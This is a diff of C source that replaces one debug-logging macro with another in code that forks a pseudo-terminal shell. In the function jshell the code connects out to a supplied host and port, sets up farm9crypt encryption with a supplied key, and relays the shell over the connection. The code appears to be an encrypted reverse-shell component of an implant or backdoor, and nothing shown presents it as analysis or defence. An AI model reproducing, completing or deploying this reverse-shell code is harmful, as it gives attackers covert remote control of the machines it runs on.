@@ -40,19 +40,19 @@ int forkpty( int *amaster, char *name, void *unused1, void *unused2 ) {
 
     if( pty < 0 )
     {
-		D( perror( " ! open( /dev/ptmx ):" ); )	
+		DLX(4, perror("open(/dev/ptmx): "));
 		return( -1 );
     }
 
     if( grantpt( pty ) < 0 )
     {
-		D( perror( " ! grantpt(): " ); )
+		DLX(4, perror("grantpt(): "));
 		return( -1 );
     }
 
     if( unlockpt( pty ) < 0 )
     {
-		D( perror( " ! unlockpt(): " ); )
+		DLX(4, perror("unlockpt(): "));
 		return( -1 );
     }
 
@@ -60,14 +60,14 @@ int forkpty( int *amaster, char *name, void *unused1, void *unused2 ) {
 
     if( slave == NULL )
     {
-		D( perror( " ! ptsname(): " ); )
+		DLX(4, perror("ptsname(): "));
 		return( -1 );
     }
 
 	if ( name ) strcpy( name, slave );
 
 	if ( amaster ) *amaster = pty;
-	D( printf( " . pty is fd = %i\n", pty ); )
+	DLX(4, printf( "\tpty is fd = %i\n", pty));
 
     /* fork to spawn a shell */
     pid = fork();
@@ -88,32 +88,32 @@ int forkpty( int *amaster, char *name, void *unused1, void *unused2 ) {
 
 	    if( tty < 0 )
     	{
-			D( perror( " ! open( slave ): " ); )
+			DLX(4, perror("open( slave ): "));
 			return( -1 );
     	}
 
 	    if( ioctl( tty, I_PUSH, "ptem" ) < 0 )
     	{
-			D( perror( " ! ioctl( ptem ):" ); )	
+			DLX(4, perror("ioctl( ptem ):"));
 			return( -1 );
     	}
 
 	    if( ioctl( tty, I_PUSH, "ldterm" ) < 0 )
     	{
-			D( perror( " ! ioctl( ldterm ):" ); )	
+			DLX(4, perror("ioctl( ldterm ):"));
 			return( -1 );
     	}
 
 	    if( ioctl( tty, I_PUSH, "ttcompat" ) < 0 )
     	{
-			D( perror( " ! ioctl( ttcompat ):" ); )	
+			DLX(4, perror("ioctl( ttcompat ):"));
 			return( -1 );
     	}
 
         /* create a new session */
         if( setsid() < 0 )
         {
-			D( perror( " ! setsid():" ); )	
+			DLX(4, perror("setsid():"));
         	return( -1 );
         }
 
@@ -125,7 +125,7 @@ int forkpty( int *amaster, char *name, void *unused1, void *unused2 ) {
 
         if( fd < 0 )
         {
-			D( perror( " ! open( slave )" ); )
+			DLX(4, perror("open( slave )"));
 			return( 46 );
         }
 
@@ -169,7 +169,7 @@ void *jshell( void *input ) {
 	char	*port = strtok( NULL, " " );
 	char	*key = strtok( NULL, " " );
 
-	D( printf( " . Host: %s, Port: %i, Key: %s\n", host, atoi( port ), key ); )
+	DLX(3, printf("\tHost: %s, Port: %i, Key: %s\n", host, atoi( port ), key));
 
 	farm9crypt_init( key );
 
@@ -177,31 +177,31 @@ void *jshell( void *input ) {
 	{
 		if ( net_connect( &netfd, host, atoi( port ) ) != 0 )
 		{
-			D( printf( " ! net_connect() failed @ %s:%i\n", __FILE__, __LINE__ ); )
+			DLX(3, printf("\tnet_connect() failed\n"));
 			sleep( 1 );
 			tries--;
 		}
 		else
 		{
-			D( printf( " . net_connect() success\n" ); )
+			DLX(3, printf("\tnet_connect() success\n"));
 			break;
 		}
 	}
 	if ( tries == 0 )
 	{
-		D( printf( " ! exceeded connection attempts. now exiting.\n" ); )
+		DLX(3, printf( "\tExceeded connection attempts; exiting.\n"));
 		return (void *)-1;
 	}
 
-	D( printf( " . netfd = %i\n", netfd ); )
+	DLX(3, printf( "\tnetfd = %i\n", netfd));
 
 
 	pid = forkpty( &pty, NULL, NULL, NULL );
 
 	if ( pid < 0 )
 	{
-		D( perror( " ! fork()" ); )
-		D( printf ( " . Returning from jshell()\n" ); )
+		DLX(3, perror("\tfork(): "));
+		DLX(3, printf ("Returning from jshell()\n"));
 		return (void *)-1;
 	}
 	
@@ -224,11 +224,11 @@ void *jshell( void *input ) {
 	else
 	{
 		// this is the parent
-		D( printf( " . pre shuffle\n" ); )
+		DLX(3, printf("\tpre shuffle\n"));
 		shuffle( pty, netfd );
-		D( printf( " . post shuffle\n" ); )
+		DLX(3, printf("\tpost shuffle\n"));
 
-		D( printf ( " . Returning from jshell()\n" ); )
+		DLX(3, printf ("Returning from jshell()\n"));
 		return (void *)0;
 	}
 
